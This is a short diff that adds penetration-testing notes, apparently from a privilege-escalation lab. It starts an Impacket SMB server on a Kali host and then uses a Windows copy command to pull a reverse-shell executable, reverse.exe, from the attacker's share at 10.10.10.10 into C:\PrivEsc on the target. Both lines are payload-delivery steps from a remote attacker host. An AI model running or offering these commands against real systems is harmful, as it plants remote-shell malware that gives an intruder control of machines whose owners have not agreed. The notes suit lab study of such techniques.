@@ -1,0 +1,7 @@
+
+#Start The SMB Server at the current dir with the name of host
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  
+
+#Next use the smiple command COPY on windows  
+
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
